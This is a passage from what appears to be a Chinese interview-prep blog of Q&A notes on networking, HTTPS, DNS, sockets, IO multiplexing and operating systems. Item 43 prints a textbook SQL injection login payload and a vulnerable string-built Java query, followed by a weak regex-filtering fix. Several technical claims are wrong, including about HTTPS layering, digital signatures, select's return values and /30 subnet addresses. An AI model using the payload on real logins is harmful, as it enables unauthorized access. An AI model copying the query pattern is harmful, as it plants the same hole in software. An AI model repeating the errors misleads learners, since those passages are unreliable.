传输层：TCP、UDP：</strong></p><p><strong>传输层的任务就是负责主机中两个进程之间的通信。</strong>因特网的传输层可使用两种不同协议：即面向连接的传输控制协议TCP，和无连接的用户数据报协议UDP。面向连接的服务能够提供可靠的交付，但无连接服务则不保证提供可靠的交付，它只是“尽最大努力交付”。这两种服务方式都很有用，备有其优缺点。在分组交换网内的各个交换结点机都没有传输层。</p><p><strong>3 - 网络层：IP、ARP：</strong></p><p><strong>网络层负责为分组交换网上的不同主机提供通信。</strong>在发送数据时，网络层将运输层产生的报文段或用户数据报封装成分组或包进行传送。在TCP&#x2F;IP 体系中，分组也叫作IP 数据报，或简称为数据报。网络层的另一个任务就是要选择合适的路由，使源主机运输层所传下来的分组能够交付到目的主机。</p><p><strong>4 - 数据链路层：</strong></p><p><strong>当发送数据时，数据链路层的任务是将在网络层交下来的IP 数据报组装成帧，在两个相邻结点间的链路上传送以帧为单位的数据。</strong>每一帧包括数据和必要的控制信息（如同步信息、地址信息、差错控制、以及流量控制信息等）。控制信息使接收端能够知道—个帧从哪个比特开始和到哪个比特结束。控制信息还使接收端能够检测到所收到的帧中有无差错。</p><p><strong>5 - 物理层：</strong></p><p><strong>物理层的任务就是透明地传送比特流。</strong>在物理层上所传数据的单位是比特。传递信息所利用的一些物理媒体，如双绞线、同轴电缆、光缆等，并不在物理层之内而是在物理层的下面。因此也有人把物理媒体当做第0 层。</p><h3 id="30-HTTPS的工作过程？"><a href="#30-HTTPS的工作过程？" class="headerlink" title="30 - HTTPS的工作过程？"></a>30 - HTTPS的工作过程？</h3><p>HTTPS协议 &#x3D; HTTP协议 + SSL&#x2F;TLS协议</p><p>SSL(Secure Socket Layer 安全套接层)</p><p>TLS(Transport Layer Security 安全传输层协议)</p><p>由于HTTPS的推出受到了很多人的欢迎，在SSL更新到3.0时，IETF对SSL3.0进行了标准化，并添加了少数机制(但是几乎和SSL3.0无差异)，标准化后的IETF更名为TLS1.0(Transport Layer Security 安全传输层协议)，即 <strong>TLS就是SSL的3.1新版本</strong></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20210914105413736.png"></p><p>1、浏览器往服务器的443端口发起请求，请求里携带了浏览器支持的加密算法和哈希算法。</p><p>2、服务器收到请求，选择浏览器支持的加密算法和哈希算法，并将自己的身份信息（地址等）以证书的形式发送给浏览器，</p><p>3、客户端收到网站的证书之后要：</p><ul><li>验证证书的合法性</li><li>如果验证通过，浏览器会生成一个随机数R，并用证书中的公钥进行加密，将加密的R传送给服务器</li></ul><p>4、服务器接收客户端传来的信息：</p><ul><li>用自己的私钥解密得到R，再用以R为密钥使用<strong>对称加密算法</strong>加密网页内容并传输给浏览器。</li></ul><p>5、客户端以R为密钥使用之前约定好的解密算法获取网页内容</p><h3 id="31-HTTP-和-HTTPS-的区别？"><a href="#31-HTTP-和-HTTPS-的区别？" class="headerlink" title="31 - HTTP 和 HTTPS 的区别？"></a>31 - HTTP 和 HTTPS 的区别？</h3><h4 id="HTTP-和-HTTPS的基本概念"><a href="#HTTP-和-HTTPS的基本概念" class="headerlink" title="HTTP 和 HTTPS的基本概念"></a>HTTP 和 HTTPS的基本概念</h4><ul><li><strong>超文本传输协议（Hyper Text Transfer Protocol，HTTP）：</strong>是互联网上应用最为广泛的一种网络协议，是一个客户端和服务器端请求和应答的标准（TCP），用于从<strong>WWW服务器</strong>传输超文本到<strong>本地浏览器</strong>的传输协议，它可以使浏览器更加高效，使网络传输减少。</li><li><strong>HTTPS （全称：Hyper Text Transfer Protocol over SecureSocket Layer）：</strong>是以安全为目标的HTTP通道，简单讲是HTTP的安全版，即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。<ul><li>HTTPS协议的主要作用可以分为两种：<ul><li>一种是建立一个信息安全通道，来保证数据传输的安全；</li><li>另一种就是确认网站的真实性。</li></ul></li></ul></li></ul><h4 id="HTTPS-和-HTTP-的区别主要如下："><a href="#HTTPS-和-HTTP-的区别主要如下：" class="headerlink" title="HTTPS 和 HTTP 的区别主要如下："></a>HTTPS 和 HTTP 的区别主要如下：</h4><ul><li><strong>开销：</strong>HTTPS协议需要到CA申请证书，一般免费证书较少，因而需要一定费用。</li><li><strong>端口不同：</strong>HTTP和HTTPS使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。</li><li><strong>安全性：</strong>HTTP的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比HTTP协议安全。</li><li><strong>资源消耗：</strong>HTTP是超文本传输协议，信息是明文传输；HTTPS则是具有安全性的SSL加密传输协议，需要消耗更多的CPU和内存资源</li><li><strong>在OSI模型中，HTTP工作于应用层，而HTTPS工作于传输层；</strong></li></ul><h3 id="33-HTTPS的优缺点？"><a href="#33-HTTPS的优缺点？" class="headerlink" title="33 - HTTPS的优缺点？"></a>33 - HTTPS的优缺点？</h3><h4 id="HTTPS-优点："><a href="#HTTPS-优点：" class="headerlink" title="HTTPS 优点："></a>HTTPS 优点：</h4><ul><li>HTTPS 传输数据过程中使用密钥进行加密，所以<strong>安全性更高</strong></li><li>HTTPS 协议可以认证用户和服务器，<strong>确保数据发送到正确的用户和服务器</strong></li></ul><h4 id="HTTPS-缺点："><a href="#HTTPS-缺点：" class="headerlink" title="HTTPS 缺点："></a>HTTPS 缺点：</h4><ul><li><p><strong>HTTPS 握手阶段延时较高：</strong>由于在进行HTTP 会话之前还需要进行SSL 握手，因此HTTPS 协议握手阶段延时增加</p></li><li><p><strong>HTTPS 部署成本高：</strong>一方面HTTPS 协议需要使用证书来验证自身的安全性，所以需要购买CA证书；另一方面由于采用HTTPS 协议需要进行加解密的计算，占用CPU 资源较多。</p></li></ul><h3 id="34-什么是数字签名？"><a href="#34-什么是数字签名？" class="headerlink" title="34 - 什么是数字签名？"></a>34 - 什么是数字签名？</h3><p>为了避免数据在传输过程中被替换，比如黑客修改了报文内容，但是用户并不知道，所以需要让发送端做一个数字签名，把数据的摘要信息进行一个加密，比如MD5，得到一个签名，和数据一起发送。然后接收端把数据摘要进行MD5加密，如果和签名一样，则说明数据是正确的</p><h3 id="35-什么是数字证书？"><a href="#35-什么是数字证书？" class="headerlink" title="35 - 什么是数字证书？"></a>35 - 什么是数字证书？</h3><p>对称加密中，双方使用公钥进行解密。虽然数字签名可以保证数据不被替换，但数据是由公钥加密的，如果公钥也被替换，则仍然可以伪造数据，因为用户不知道对方提供的公钥是真是假。<strong>为了保证发送方的公钥是真的，CA证书机构会负责颁发一个证书，里面的公钥确保是真的，</strong>用户请求服务器时，服务器将证书给用户，这个证书是经由系统内置证书的备案过的。</p><h3 id="36-谈谈你对停止等待协议（数据链路层）的理解？"><a href="#36-谈谈你对停止等待协议（数据链路层）的理解？" class="headerlink" title="36 - 谈谈你对停止等待协议（数据链路层）的理解？"></a>36 - 谈谈你对停止等待协议（数据链路层）的理解？</h3><p>停止等待协议是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认，在收到确认后再发下一个分组。在停止等待协议中，若接收方收到重复分组，就丢弃该分组，但同时还要发送确认。主要包括以下几种情况：</p><ul><li>无差错情况</li><li>出现差错情况（超时重传）</li><li>确认丢失和确认迟到</li></ul><h3 id="37-谈谈你对ARQ协议（数据链路层）的理解？"><a href="#37-谈谈你对ARQ协议（数据链路层）的理解？" class="headerlink" title="37 - 谈谈你对ARQ协议（数据链路层）的理解？"></a>37 - 谈谈你对ARQ协议（数据链路层）的理解？</h3><h4 id="自动重传请求协议-ARQ"><a href="#自动重传请求协议-ARQ" class="headerlink" title="自动重传请求协议 ARQ"></a>自动重传请求协议 ARQ</h4><p>停止等待协议中超时重传是指只要超过一段时间仍然没有收到确认，就重传之前发过的分组。因此每发送完一个分组就需要设置一个超时计时器，其重传时间应该比数据在分组传输的平均往返时间更长一些。这种自动重传方式称为自动重传请求ARQ</p><h4 id="连续ARQ协议"><a href="#连续ARQ协议" class="headerlink" title="连续ARQ协议"></a>连续ARQ协议</h4><p>连续ARQ可提高信道利用率。发送方维持一个发送窗口，凡是位于窗口内的分组可以连续发送出去，而不需要等待对方确认。接收方一般采用累计确认，对按序到达的最后一个分组发送确认，表明到这个分组为止是所有分组都已经正确收到。</p><h3 id="38-ARP协议（地址转换协议）的工作原理"><a href="#38-ARP协议（地址转换协议）的工作原理" class="headerlink" title="38 - ARP协议（地址转换协议）的工作原理"></a>38 - ARP协议（地址转换协议）的工作原理</h3><p>ARP协议完成了IP地址与物理地址的映射。</p><p>ARP（地址解析）协议是一种解析协议，本来主机是完全不知道这个IP对应的是哪个主机的哪个接口，当主机要发送一个IP包的时候，会首先查一下自己的ARP高速缓存表（最近数据传递更新的IP-MAC地址对应表），如果查询的IP－MAC值对不存在，那么主机就向网络广播一个ARP请求包，这个包里面就有待查询的IP地址，而直接收到这份广播的包的所有主机都会查询自己的IP地址，如果收到广播包的某一个主机发现自己符合条件，那么就回应一个ARP应答包（将自己对应的IP-MAC对应地址发回主机），源主机拿到ARP应答包后会更新自己的ARP缓存表。源主机根据新的ARP缓存表准备好数据链路层的的数据包发送工作。</p><h3 id="39-DNS的解析过程？"><a href="#39-DNS的解析过程？" class="headerlink" title="39 - DNS的解析过程？"></a>39 - DNS的解析过程？</h3><ul><li>请求一旦发起，若是chrome浏览器，先在浏览器找之前有没有缓存过的域名所对应的IP地址，有的话，直接跳过dns解析，若是没有，就会找硬盘的hosts文件，查找hosts文件中是否有对应的IP地址</li><li>如果本地的hosts文件没有对应的IP地址，浏览器会发出一个DNS请求到本地DNS服务器，本地DNS服务器一般是网络接入服务器商提供，比如中国电信，中国移动等。</li><li>查询输入的网址的DNS请求到达本地DNS服务器之后，本地DNS服务器会首先查询它的缓存记录，如果缓存中有此条记录，就可以直接返回结果，此过程是<strong>递归查询</strong>。如果没有，本地DNS服务器还要向DNS根服务器进行查询。</li><li>根域名服务器收到本地域名服务器发出的迭代查询请求报文时，要么给出所要查询的IP地址，要么告诉本地服务器：”你下一步应当向哪一个域名服务器进行查询。”然后让本地服务器进行后续的查询。本地DNS服务器继续向域服务器发出请求，比如请求的对象是.com域服务器。.com域服务器收到请求之后，也不会直接返回域名和IP地址的对应关系，而是告诉本地DNS服务器，你的域名的解析服务器的地址。</li><li>最后，本地DNS服务器向域名的解析服务器发出请求，这时就能收到一个域名和IP地址对应关系，本地DNS服务器不仅要把IP地址返回给用户电脑，还要把这个对应关系保存在缓存中，以备下次别的用户查询时，可以直接返回结果，加快网络访问。</li></ul><ol><li><p><strong>主机向本地域名服务器的查询一般都是采用递归查询。</strong></p></li><li><p><strong>本地域名服务器向根域名服务器的查询是迭代查询。</strong></p></li></ol><h3 id="40-谈谈你对域名缓存的了解？"><a href="#40-谈谈你对域名缓存的了解？" class="headerlink" title="40 - 谈谈你对域名缓存的了解？"></a>40 - 谈谈你对域名缓存的了解？</h3><p>为了提高DNS查询效率，并减轻服务器的负荷和减少因特网上的DNS查询报文的数量，在域名服务器中广泛应用了高速缓存，用来存放最近查询过的域名以及从何处获得域名映射信息的记录</p><h3 id="41-IP地址有哪些分类？"><a href="#41-IP地址有哪些分类？" class="headerlink" title="41 - IP地址有哪些分类？"></a>41 - IP地址有哪些分类？</h3><p>A类地址（1~126）：网络号占前8位，以0开头，主机号占24位</p><p>B类地址（128~191）：网络号前16位，以10开头，主机号占后16位</p><p>C类地址（192~223）：网络号前24位，以110开头，主机号占后8位</p><p>D类地址（224~239）：以1110开头，保留位多播地址</p><p>E类地址（240~255）：以1111开头，保留位今后使用</p><h3 id="42-特殊网络地址："><a href="#42-特殊网络地址：" class="headerlink" title="42 - 特殊网络地址："></a>42 - 特殊网络地址：</h3><p>（1）<strong>127.0.0.1</strong>：</p><p>127是一个保留地址，该地址是指电脑本身，主要作用是预留下作为测试使用，即Windows下的localhost</p><p>（2）**10.*.*.*，172.16.*.*――172.31.*.*，192.168.*.***：</p><p>上面三个网段是私有地址，可以用于自己组网使用，这些地址主要用于企业内部网络中，但不能够在Internet网上使用</p><p>（3）<strong>0.0.0.0</strong></p><p>它表示的是这样一个集合，所有不清楚的主机和目的网络。这里的不清楚是指在本机的路由表里没有特定条目指明如何到达。</p><p>（4）<strong>255.255.255.255</strong></p><p>受限制的广播地址</p><p>（5）<strong>224.0.0.0—239.255.255.255</strong></p><p>这是一组组播地址，需要注意它与广播地址的区别，其中224.0.0.1特指所有的主机，224.0.0.2特指所有的路由器，224.0.0.5指所有的OSPF路由器地址，224.0.0.13指PIMV2路由器的地址。</p><h3 id="43-什么是SQL注入？举个例子"><a href="#43-什么是SQL注入？举个例子" class="headerlink" title="43 - 什么是SQL注入？举个例子"></a>43 - 什么是SQL注入？举个例子</h3><p>SQL注入就是通过SQL命令插入到 <strong>Web表单提交</strong> 或 <strong>输入域名</strong> 或 <strong>页面请求的字符串</strong>，最终达到欺骗服务器执行恶意的SQL命令。</p><p>如果在一个登录界面，要求输入用户名或密码，可以这样输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：&#x27;or 1 = 1 --</span><br><span class="line">密码：</span><br></pre></td></tr></table></figure><p>从理论上来说后台会验证如下SQL语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user_table where username= &#x27; &quot;</span> + userName +<span class="string">&quot; &#x27; and password=&#x27;&quot;</span> +password +<span class="string">&quot; &#x27;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>当输入上面的用户名后，SQL语句变为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> user_table <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="comment">-- and password=&#x27; &#x27;</span></span><br></pre></td></tr></table></figure><p>此语句一定可以执行成功，后面密码编程注释。用户轻易骗过系统，获取合法身份</p><p><strong>解决方法：使用正则表达式过滤传入参数</strong></p><h3 id="44-什么是XSS攻击？"><a href="#44-什么是XSS攻击？" class="headerlink" title="44 - 什么是XSS攻击？"></a>44 - 什么是XSS攻击？</h3><p>XSS攻击是指恶意攻击者利用网站没有对用户提交数据进行转义处理或过滤不足的缺点，进而添加一些脚本代码嵌入到web页面中去，使别的用户访问都会执行相应的嵌入代码，从而盗取用户资料、利用用户身份进行某种动作或对访问者进行病毒侵害的一种攻击方式</p><h3 id="45-Cookie-和-Session-有什么区别？"><a href="#45-Cookie-和-Session-有什么区别？" class="headerlink" title="45 - Cookie 和 Session 有什么区别？"></a>45 - Cookie 和 Session 有什么区别？</h3><p>1、由于HTTP协议是无状态的协议，所以服务端需要记录用户的状态时，就需要某种机制来识别具体的用户，这个机制就是Session。典型的应用场景：购物车</p><p>​当点击下单按钮时，由于HTTP是无状态的，所以并不知道是哪个用户操作 的，所以服务端要为特定的用户创建特点的Session，用于标识这个用户，并跟踪这个用户，才知道其购物车中的物品</p><p>​Session是保存在服务端的，有一个唯一标识。在服务端保存Session的方法很多，内存、数据库、文件都有，集群的时候也要考虑Session的转移，在大型的网站，一般会有专门的Session服务器集群，用来保存用户会话，这个时候Session信息都是放在内存的，使用一些缓存服务比如Memcached之类的来存放。</p><p>2、那服务端如何识别特定用户？这时需要用到Cookie。每次HTTP请求的时候，客户端都会发送相应的Cookie信息到服务端。实际上大多数的应用都是用Cookie来实现Session追踪的，第一次创建Session的时候，服务端会在HTTP协议中告诉客户端，需要<strong>在Cookie里面记录一个Session ID</strong>，以后每次请求把这个会话ID发送到服务器，服务器就能识别特定用户了。</p><p>3、Cookie可以保存账号信息，访问网站的时候，网站页面的脚本可以读取这个信息，自动填写用户名</p><p><strong>总结：</strong></p><ul><li><strong>Session是在服务端保存的一个数据结构，用来追踪用户的状态，</strong>这个数据可以保存在集群、数据库、文件中。</li><li><strong>Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，</strong>也是实现Session的一种方式</li></ul><h3 id="46-Session的工作原理？"><a href="#46-Session的工作原理？" class="headerlink" title="46 - Session的工作原理？"></a>46 - Session的工作原理？</h3><p>Session的工作原理是客户端登录完成之后，服务器会创建对应的Session，Session创建完之后，会把Session的ID发送给客户端，客户端再存储到浏览器中。这样客户端每次访问服务器时，都会带着SessionID，服务器拿到SessionID之后，在内存找到与之对应的Session 这样就可以正常工作了。</p><h3 id="47-Udp如何实现可靠性"><a href="#47-Udp如何实现可靠性" class="headerlink" title="47 - Udp如何实现可靠性"></a>47 - Udp如何实现可靠性</h3><ul><li>1.udp可以增加消息编号；</li><li>2.对每个消息编号提供ACK，在udp应用层增加应答机制；</li><li>3.没有应答的增加重传机制</li><li>4.增加缓存，ACK完的才从缓存中清除</li></ul><h2 id="二、网络编程"><a href="#二、网络编程" class="headerlink" title="二、网络编程"></a>二、网络编程</h2><h3 id="1-socket-编程步骤"><a href="#1-socket-编程步骤" class="headerlink" title="1 - socket 编程步骤"></a>1 - socket 编程步骤</h3><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/20210826152834.png"></p><h4 id="服务器的工作流程："><a href="#服务器的工作流程：" class="headerlink" title="服务器的工作流程："></a>服务器的工作流程：</h4><ul><li><strong>（1）创建 socket：</strong>创建服务端的socket。</li><li><strong>（2）绑定 bind：</strong>把服务端用于通信的地址和端口绑定到socket上。</li><li><strong>（3）监听 listen：</strong>把socket设置为监听模式。</li><li><strong>（4）接受连接 accept：</strong>接受客户端的连接。</li><li><strong>（5）通信 recv( ) &#x2F; send( ) ：</strong>与客户端通信，接收客户端发过来的报文后，回复处理结果，重复此过程。</li><li><strong>（6）关闭 close( )：</strong>关闭socket，释放资源。</li></ul><h4 id="客户端工作流程："><a href="#客户端工作流程：" class="headerlink" title="客户端工作流程："></a>客户端工作流程：</h4><ul><li><strong>（1）创建 socket：</strong>创建客户端的socket。</li><li><strong>（2）发送连接 connect( )：</strong>向服务器发起连接请求</li><li><strong>（3）通信 recv( ) &#x2F; send( )：</strong>与服务端通信，发送一个报文后等待回复，然后再发下一个报文。重复此过程，直到全部的数据被发送完。</li><li><strong>（4）关闭 close( )：</strong>关闭socket，释放资源。</li></ul><h3 id="2-tcp三次握手的过程中，accept发生在三次握手的哪个阶段？"><a href="#2-tcp三次握手的过程中，accept发生在三次握手的哪个阶段？" class="headerlink" title="2 - tcp三次握手的过程中，accept发生在三次握手的哪个阶段？"></a>2 - tcp三次握手的过程中，accept发生在三次握手的哪个阶段？</h3><p>客户端的connect引起三次握手</p><p>服务器在socket、bind、listen后，阻塞在accept，三次握手完成后，accept返回一个fd，因此accept发生在三次握手后。</p><h3 id="3-请问server-端监听端口，但还没有客户端连接进来，此时进程处于什么状态？"><a href="#3-请问server-端监听端口，但还没有客户端连接进来，此时进程处于什么状态？" class="headerlink" title="3 - 请问server 端监听端口，但还没有客户端连接进来，此时进程处于什么状态？"></a>3 - 请问server 端监听端口，但还没有客户端连接进来，此时进程处于什么状态？</h3><p>这个取决于看服务端的编程模型：</p><ul><li><strong>正常处于阻塞状态，</strong></li><li><strong>如果使用了epoll,select 等这样的 io 复用情况下，处于运行状态</strong></li></ul><h3 id="4-IO模型有哪几种？"><a href="#4-IO模型有哪几种？" class="headerlink" title="4 - IO模型有哪几种？"></a>4 - IO模型有哪几种？</h3><ul><li>多路复用IO</li><li>阻塞IO</li><li>非阻塞IO</li><li>信号驱动IO</li><li>异步IO</li></ul><h3 id="5-什么是IO多路复用？"><a href="#5-什么是IO多路复用？" class="headerlink" title="5 - 什么是IO多路复用？"></a>5 - 什么是IO多路复用？</h3><ul><li><p>I&#x2F;O多路复用的本质是使用select ，poll 或 epoll函数，挂起进程，当一个或多个IO事件发生之后，将控制返回给用户进程。</p></li><li><p>以服务器编程为例，传统的多进程（多线程）并发模型，在处理用户连接时都是开启一个新的线程或进程去处理一个新的连接，而IO多路复用则是可以在一个进程（线程）中同时监听多个网络IO事件，也就是多个文件描述符</p></li></ul><h3 id="6-IO多路复用的优缺点？"><a href="#6-IO多路复用的优缺点？" class="headerlink" title="6 - IO多路复用的优缺点？"></a>6 - IO多路复用的优缺点？</h3><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><ul><li>相比基于进程的模型，IO多路复用给程序员更多的程序行为控制</li><li>IO多路复用只需要一个进程就可以处理多个事件，单个进程使得数据共享变得更容易，调试也更容易</li><li>在单一的进程上下文中，不会有多进程多线程模型的切换开销</li></ul><h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><ul><li>业务逻辑处理困难，编程困难</li><li>不能充分利用多核处理器</li></ul><h3 id="7-说一说select的缺点？"><a href="#7-说一说select的缺点？" class="headerlink" title="7 - 说一说select的缺点？"></a>7 - 说一说select的缺点？</h3><ul><li><p>每次调用select，都需要把监听的<strong>文件描述符集合 fd_set</strong>从用户态拷贝多内核态，从算法角度来说就是$O(N)$的时间开销</p></li><li><p>每次调用select返回之后都需要遍历所有文件描述符，判断哪些文件描述符有读写事件发生，也是$O(N)$的时间开销</p></li><li><p>内核对被监控的文件描述符的集合大小做了限制，并且这个是通过宏控制的，大小不可改变，为1024。这一点和上一个缺点是矛盾的，文件描述符设大了，遍历时间就长，其效率也会下降</p></li></ul><h3 id="8-说一说-poll模型的缺点？"><a href="#8-说一说-poll模型的缺点？" class="headerlink" title="8 - 说一说 poll模型的缺点？"></a>8 - 说一说 poll模型的缺点？</h3><ul><li>poll和select本质上没有差别，管理多个描述符也是进行轮询，根据描述符的状态进行处理，但是<strong>poll没有最大文件描述符数量的限制。</strong><ul><li>select采用fdset（fdset采用了bitmap），<strong>poll采用了数组</strong>，所以表示的描述符比select大</li></ul></li><li>poll和select同样存在一个缺点就是，文件描述符的数组被整体复制于用户态和内核态的地址空间之间，而不管这些文件描述符是否有事件，它们的开销随着文件描述符数量的增加而线性增大。</li><li>poll返回后，也需要遍历整个描述符的数组才能得到有事件的描述符</li></ul><h3 id="9-说一说epoll的好处-以及-LT和ET？"><a href="#9-说一说epoll的好处-以及-LT和ET？" class="headerlink" title="9 - 说一说epoll的好处 以及 LT和ET？"></a>9 - 说一说epoll的好处 以及 LT和ET？</h3><ul><li>epoll解决了<strong>select和poll在文件描述符集合拷贝和遍历上的问题</strong>，能够在一个进程中监听多个文件描述符，并且十分高效</li><li>在内核当中epoll是以红黑树的方式组织监听事件的，所以<strong>查询开销是 $O(\log{n})$<strong>。采用</strong>回调的方式检测就绪事件，时间复杂度是$O(1)$</strong></li><li>在注册监听事件时从用户态将数据传入内核态；当返回时需要将就绪队列的内容拷贝到用户空间</li></ul><p><strong>LT（Level Trigger） 水平触发：</strong> 效率会低于ET触发，尤其在高并发大流量的情况下。但是LT对代码编写要求比较低，不容易出现问题。LT模式服务编写上的表现是：只要有数据没有被获取，内核就不断通知你，因此不用担心时间丢失的情况。</p><ul><li>水平触发中只要输入缓冲中还剩有数据，就将以事件方式再次注册。接下来通过如下对话介绍边缘触发的事件特性。</li></ul><p><strong>ET（Edge Trigger） 边缘触发：</strong> 效率非常高，在高并发大流量的情况下，会比LT少很多epoll的系统调用，因此效率高。但是对编程要求高，需要细致的处理每个请求，否则容易发生丢失事件的情况</p><ul><li>边缘触发中输入缓冲收到数据时仅注册1 次该事件。即使输入缓冲中还留有数据，也不会再进行注册。</li></ul><h3 id="10-TCP通信中，select到读事件，但是读到的数据量是0，为什么？如何解决？"><a href="#10-TCP通信中，select到读事件，但是读到的数据量是0，为什么？如何解决？" class="headerlink" title="10 - TCP通信中，select到读事件，但是读到的数据量是0，为什么？如何解决？"></a>10 - TCP通信中，select到读事件，但是读到的数据量是0，为什么？如何解决？</h3><ul><li>select 返回 0 代表超时，返回 1代表出错</li><li>select到读时间，但是读到的数据量为0，说明对方已经关闭了socket的读端。本端关闭读即可</li><li>当select出错时，会将接口设置为可读又可写。这时候就可以通过判断select的返回值是否为-1确定有没有出错</li></ul><h3 id="11-connect方法会阻塞，请问有什么方法可以避免其长时间阻塞？"><a href="#11-connect方法会阻塞，请问有什么方法可以避免其长时间阻塞？" class="headerlink" title="11 - connect方法会阻塞，请问有什么方法可以避免其长时间阻塞？"></a>11 - connect方法会阻塞，请问有什么方法可以避免其长时间阻塞？</h3><ul><li>最常用最有效的方法是加定时器</li><li>也可以采用非阻塞模式</li><li>或者考虑采用异步传输机制，同步传输与异步传输的主要区别在于同步传输中，如果调用recvfrom后会一致阻塞运行，从而导致调用线程暂时运行；异步传输则立即返回</li></ul><h3 id="12-网络中，如果客户端突然掉线或重启，服务端怎么样才能立刻知道？"><a href="#12-网络中，如果客户端突然掉线或重启，服务端怎么样才能立刻知道？" class="headerlink" title="12 - 网络中，如果客户端突然掉线或重启，服务端怎么样才能立刻知道？"></a>12 - 网络中，如果客户端突然掉线或重启，服务端怎么样才能立刻知道？</h3><p>若客户端掉线或重启，服务端会收到复位信号</p><h3 id="13-socket编程，如果client断电了，服务器如何快速知道？"><a href="#13-socket编程，如果client断电了，服务器如何快速知道？" class="headerlink" title="13 - socket编程，如果client断电了，服务器如何快速知道？"></a>13 - socket编程，如果client断电了，服务器如何快速知道？</h3><p>有数据流动的情况下，可以使用定时器。如果没有数据流动，使用socket选项SO_KEEPALIVE，做心跳检测</p><h3 id="14-子网-210-27-48-21-x2F-30有多少个可用地址？分别是？"><a href="#14-子网-210-27-48-21-x2F-30有多少个可用地址？分别是？" class="headerlink" title="14- 子网 210.27.48.21&#x2F;30有多少个可用地址？分别是？"></a>14- 子网 210.27.48.21&#x2F;30有多少个可用地址？分别是？</h3><p>30表示网络号是30位，剩下2位中11是广播地址，00是组播地址，只有01和10可以作为主机地址。</p><p>如果广播或组播地址也可用，就是4个</p><h3 id="15-TTL是什么？有什么用处？通常哪些工具会用到？"><a href="#15-TTL是什么？有什么用处？通常哪些工具会用到？" class="headerlink" title="15 - TTL是什么？有什么用处？通常哪些工具会用到？"></a>15 - TTL是什么？有什么用处？通常哪些工具会用到？</h3><p>TTL （Time To Live），没经过一个路由TTL会减1，如果变成0，包就会被丢弃。其作用是防止包在有回路的网络上死转，浪费网络资源。ping和traceroute都用了TTL</p><h3 id="16-路由表的作用？linux中如何配置一条默认路由？"><a href="#16-路由表的作用？linux中如何配置一条默认路由？" class="headerlink" title="16 - 路由表的作用？linux中如何配置一条默认路由？"></a>16 - 路由表的作用？linux中如何配置一条默认路由？</h3><p>路由表是用来决定如何将包从一个子网传送到另一个子网的</p><p>在Linux中用 <code>route add default gw &lt;默认路由器IP&gt;</code>  配置一条默认路由</p><h3 id="17-如何测试两台主机是否连通？"><a href="#17-如何测试两台主机是否连通？" class="headerlink" title="17 - 如何测试两台主机是否连通？"></a>17 - 如何测试两台主机是否连通？</h3><p>使用ping命令从一台机器ping另一台机器，如果ping不通，用traceroute可以确定是哪个路由器不能连通，然后再找其他问题</p><h3 id="18-fork一子进程后，父进程的全局变量能不能使用？"><a href="#18-fork一子进程后，父进程的全局变量能不能使用？" class="headerlink" title="18 - fork一子进程后，父进程的全局变量能不能使用？"></a>18 - fork一子进程后，父进程的全局变量能不能使用？</h3><p>fork后子进程将拥有父进程的几乎一切资源，父子进程都各自有各自的全局变量，不能通用。不同于线程，对于线程，各个线程共享全局变量</p><h3 id="19-网络编程常用工具"><a href="#19-网络编程常用工具" class="headerlink" title="19 - 网络编程常用工具"></a>19 - 网络编程常用工具</h3><p>ping 可以用来帮助我们进行网络连通性的探测。</p><p>ifconfig，用来显示当前系统中的所有网络设备。</p><p>netstat 和 lsof 可以查看活动的连接状况。</p><p>tcpdump 可以对各种奇怪的环境进行抓包，进而帮我们了解报文，排查问题。</p><h2 id="三、操作系统"><a href="#三、操作系统" class="headerlink" title="三、操作系统"></a>三、操作系统</h2><h3 id="1-操作系统的特点"><a href="#1-操作系统的特点" class="headerlink" title="1 - 操作系统的特点"></a>1 - 操作系统的特点</h3><ul><li>并发性</li><li>共享性</li><li>虚拟性</li><li>异步性</li></ul><h3 id="2-并发和并行"><a href="#2-并发和并行" class="headerlink" title="2 - 并发和并行"></a>2 - 并发和并行</h3><ul><li><strong>并发（concurrency）：</strong>指<strong>宏观上看起来两个程序在同时运行</strong>，比如说在<strong>单核cpu 上的多任务</strong>。但是从<strong>微观上看两个程序的指令是交织着运行的</strong>，你的指令之间穿插着我的指令，我的指令之间穿插着你的，在单个周期内只运行了一个指令。<strong>这种并发并不能提高计算机的性能，只能提高效率。</strong></li><li><strong>并行（parallelism）：</strong>指<strong>严格物理意义上的同时运行</strong>，比如<strong>多核cpu</strong>，<strong>两个程序分别运行在两个核上，两者之间互不影响</strong>，单个周期内每个程序都运行了自己的指令，也就是运行了两条指令。这样说来并行的确提高了计算机的效率。所以现在的cpu 都是往多核方面发展。</li></ul><h3 id="3-同步、异步、阻塞、非阻塞的概念"><a href="#3-同步、异步、阻塞、非阻塞的概念" class="headerlink" title="3 - 同步、异步、阻塞、非阻塞的概念"></a>3 - 同步、异步、阻塞、非阻塞的概念</h3><ul><li><strong>阻塞和非阻塞：</strong><ul><li>阻塞：调用者在事件没有发生的时候，一直在等待事件发生，不能去处理别的任务这是阻塞。</li><li>非阻塞：调用者在事件没有发生的时候，可以去处理别的任务这是非阻塞。</li></ul></li><li><strong>同步和异步：</strong><ul><li>同步：调用者要一直等待返回结果，得到通知后才能进行后续的执行，这种情况是同步。</li><li>异步：调用者不用自己去查看事件有没有发生，而是等待着注册在事件上的回调函数通知自己，这种情况是异步。</li></ul></li></ul><h3 